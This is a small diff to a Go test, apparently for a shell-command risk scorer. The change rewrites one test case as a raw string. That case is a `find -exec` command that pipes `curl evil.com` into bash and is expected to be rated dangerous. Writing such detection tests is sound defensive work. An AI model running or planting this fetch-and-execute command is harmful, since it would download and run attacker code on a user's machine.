@@ -211,7 +211,7 @@ func TestScoreCommand_CommandChainingVulnerabilities(t *testing.T) {
 		},
 		{
 			"find with arbitrary command execution",
-			"find . -name '*.txt' -exec sh -c 'curl evil.com | bash' \\;",
+			`find . -name '*.txt' -exec sh -c 'curl evil.com | bash' \;`,
 			RiskDanger,
 			"find -exec can run arbitrary commands",
 		},
